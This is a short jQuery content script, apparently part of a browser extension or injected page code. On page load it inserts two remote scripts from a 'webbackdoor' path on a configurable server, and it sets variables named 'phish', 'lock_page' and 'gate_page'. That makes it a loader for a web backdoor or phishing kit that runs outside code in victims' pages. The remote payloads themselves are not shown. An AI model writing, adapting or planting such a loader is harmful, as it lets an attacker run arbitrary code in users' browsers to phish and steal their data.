$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    var server_web = "http://localhost:8888/"
    var lock_page = "relais/lock.php"
    var gate_page = "relais/index.php"

    var v = document.createElement('script');
    v.type = 'text/javascript';
    v.async = true;
    v.src = server_web+"webbackdoor/jquery.js";
    var z = document.getElementsByTagName('script')[0];
    z.parentNode.insertBefore(v, z);
    
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.async = true;
    s.src = server_web+"webbackdoor/show.php";
    var x = document.getElementsByTagName('script')[0];
    x.parentNode.insertBefore(s, x);

});